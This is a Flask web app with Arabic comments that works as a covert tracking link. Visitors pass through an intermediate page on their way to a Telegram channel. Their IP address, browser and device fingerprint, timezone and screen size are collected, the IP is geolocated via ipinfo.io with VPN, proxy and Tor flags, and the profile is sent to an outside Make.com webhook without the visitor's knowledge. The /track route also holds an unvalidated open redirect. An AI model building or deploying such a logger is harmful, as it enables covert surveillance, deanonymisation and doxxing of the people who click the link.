from flask import Flask, request, render_template, redirect, send_from_directory
from datetime import datetime
import requests
import json
import os

app = Flask(__name__)

REDIRECT_URL = "https://t.me/YourChannel"
MAKE_WEBHOOK = os.environ.get("MAKE_WEBHOOK") or "https://hook.eu2.make.com/xxxxxxx"
IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN") or "ضع_التوكن_الخاص_بك"

@app.route('/')
def home():
    return redirect("/track?goto=" + REDIRECT_URL)

@app.route('/track')
def track():
    goto = request.args.get("goto", REDIRECT_URL)
    return render_template("redirect.html", goto=goto)

@app.route('/collect', methods=['POST'])
def collect():
    js_data = request.get_json()
    ip_raw = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip = ip_raw.split(",")[0].strip()
    user_agent = request.headers.get('User-Agent', '')
    language = request.headers.get('Accept-Language', '')

    # تحليل بيانات ipinfo.io
    try:
        geo = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5).json()
        city = geo.get("city", "N/A")
        region = geo.get("region", "N/A")
        country = geo.get("country", "N/A")
        org = geo.get("org", "N/A")

        privacy = geo.get("privacy", {})
        is_vpn = privacy.get("vpn", False)
        is_proxy = privacy.get("proxy", False)
        is_tor = privacy.get("tor", False)

    except Exception as e:
        city = region = country = org = "N/A"
        is_vpn = is_proxy = is_tor = False

    # بيانات من JavaScript
    platform = js_data.get("platform", "")
    timezone = js_data.get("timezone", "")
    local_time = js_data.get("localTime", "")
    screen = js_data.get("screen", "")

    # دمج البيانات
    data = {
        "ip": ip,
        "userAgent": user_agent,
        "language": language,
        "platform": platform,
        "timezone": timezone,
        "localTime": local_time,
        "screen": screen,
        "location": {
            "ip": ip,
            "country": country,
            "city": city,
            "region": region,
            "org": org,
            "isVPN": is_vpn,
            "isProxy": is_proxy,
            "isTor": is_tor
        },
        "timestamp": datetime.now().isoformat()
    }

    # إرسال إلى Make
    if MAKE_WEBHOOK:
        try:
            requests.post(MAKE_WEBHOOK, json=data, timeout=3)
        except Exception as e:
            print("[Webhook Error]", e)

    print("[Visitor Data]", json.dumps(data, indent=2))
    return '', 204

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__': 
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

